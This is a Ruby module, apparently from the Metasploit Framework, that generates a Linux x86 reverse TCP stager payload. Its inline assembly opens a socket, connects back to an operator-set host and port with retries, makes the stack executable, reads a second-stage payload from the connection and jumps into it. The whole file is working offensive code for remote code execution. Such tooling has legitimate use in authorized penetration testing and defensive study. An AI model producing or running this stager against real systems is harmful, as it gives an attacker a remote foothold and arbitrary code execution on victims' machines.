# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/linux'
require 'msf/core/payload/linux/send_uuid'

module Msf

###
#
# Complex reverse TCP payload generation for Linux ARCH_X86
#
###


module Payload::Linux::ReverseTcp_x86

  include Msf::Payload::TransportConfig
  include Msf::Payload::Linux
  include Msf::Payload::Linux::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:          datastore['LPORT'],
      host:          datastore['LHOST'],
      retry_count:   datastore['StagerRetryCount'],
      sleep_seconds: datastore['StagerRetryWait'],
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    asm = asm_reverse_tcp(opts)
    buf = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    apply_prepends(buf)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = 300

    # Reliability adds 10 bytes for recv error checks
    space += 10

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :host The host IP to connect to
  #
  def asm_reverse_tcp(opts={})
    # TODO: reliability is coming
    retry_count  = opts[:retry_count]
    encoded_port = "0x%.8x" % [opts[:port].to_i, 2].pack("vn").unpack("N").first
    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
    seconds = (opts[:sleep_seconds] || 5.0)
    sleep_seconds = seconds.to_i
    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i

    mprotect_flags = 0b111 # PROT_READ | PROT_WRITE | PROT_EXEC

    if respond_to?(:generate_intermediate_stage)
      pay_mod = framework.payloads.create(self.refname)
      read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
    else
      # If we don't know, at least use small instructions
      read_length = 0x0c00 + mprotect_flags
    end

    # I was bored on the train, ok?
    read_reg =
      if read_length % 0x100 == mprotect_flags && read_length <= 0xff00 + mprotect_flags
        # We use `edx` as part mprotect, but at two bytes assembled, this edge case is worth checking:
        # If the lower byte will be the same, just set the upper byte
        read_length = read_length / 0x100
        'dh'
      elsif read_length < 0x100
        'dl' # Also assembles in two bytes ^.^
      elsif read_length < 0x10000
        'dx' # Shave a byte off of setting `edx`
      else
        'edx' # Take five bytes :/
      end

    asm = %Q^
        push #{retry_count}        ; retry counter
        pop esi
      create_socket:
        xor ebx, ebx
        mul ebx
        push ebx
        inc ebx
        push ebx
        push 0x2
        mov al, 0x66
        mov ecx, esp
        int 0x80                   ; sys_socketcall (socket())
        xchg eax, edi              ; store the socket in edi

      set_address:
        pop ebx                    ; set ebx back to zero
        push #{encoded_host}
        push #{encoded_port}
        mov ecx, esp

      try_connect:
        push 0x66
        pop eax
        push eax
        push ecx
        push edi
        mov ecx, esp
        inc ebx
        int 0x80                   ; sys_socketcall (connect())
        test eax, eax
        jns mprotect

      handle_failure:
        dec esi
        jz failed
        push 0xa2
        pop eax
        push 0x#{sleep_nanoseconds.to_s(16)}
        push 0x#{sleep_seconds.to_s(16)}
        mov ebx, esp
        xor ecx, ecx
        int 0x80                   ; sys_nanosleep
        test eax, eax
        jns create_socket
        jmp failed
    ^

    asm << asm_send_uuid if include_send_uuid

    asm << %Q^
      mprotect:
        mov dl, 0x#{mprotect_flags.to_s(16)}
        mov ecx, 0x1000
        mov ebx, esp
        shr ebx, 0xc
        shl ebx, 0xc
        mov al, 0x7d
        int 0x80                  ; sys_mprotect
        test eax, eax
        js failed

      recv:
        pop ebx
        mov ecx, esp
        cdq
        mov #{read_reg},  0x#{read_length.to_s(16)}
        mov al, 0x3
        int 0x80                  ; sys_read (recv())
        test eax, eax
        js failed
        jmp ecx

      failed:
        mov eax, 0x1
        mov ebx, 0x1              ; set exit status to 1
        int 0x80                  ; sys_exit
    ^

    asm
  end

end

end
